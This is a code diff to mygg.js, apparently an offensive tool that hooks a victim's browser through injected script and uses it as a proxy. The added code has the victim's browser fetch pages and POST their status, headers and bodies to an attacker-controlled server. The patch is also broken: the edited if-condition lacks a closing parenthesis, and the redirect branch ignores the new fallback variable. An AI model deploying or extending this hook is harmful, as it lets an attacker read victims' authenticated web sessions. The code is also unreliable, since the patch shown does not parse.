@@ -1,6 +1,6 @@
 /* --------- Info --------- */
 
-//  mygg.js v0.3.2
+//  mygg.js v0.3.3
 //  Author: Daniel Solstad
 //  Repository: https://github.com/dsolstad/mygg.js
 
@@ -301,8 +301,11 @@ function makeRequest(id, method, url, head, body) {
             formData.append('method', method);
             formData.append('url', url);
 
+            /* Ugly hack for old browser's that doesn't support responseURL */
+            responseURL = (target_http.responseURL? target_http.responseURL : url);
+
             /* Checking if the browser got a redirect. */
-            if (stripProt(url) == stripProt(target_http.responseURL)) {
+            if (stripProt(url) == stripProt(responseURL) {
                 formData.append('status', target_http.status);
                 formData.append('headers', target_http.getAllResponseHeaders());
                 var blob = new Blob([target_http.response], {type: 'application/octet-stream'});
@@ -310,7 +313,7 @@ function makeRequest(id, method, url, head, body) {
             } else {
                 /* Need to redirect the attacking browser too. */
                 formData.append('status', '301');
-                formData.append('head', "Location: " + target_http.responseURL);
+                formData.append('headers', "Location: " + target_http.responseURL);
             }
             var mygg_http = new XMLHttpRequest();
             mygg_http.open("POST", "//${config.domain}:" + getPort() + "/responses", true);
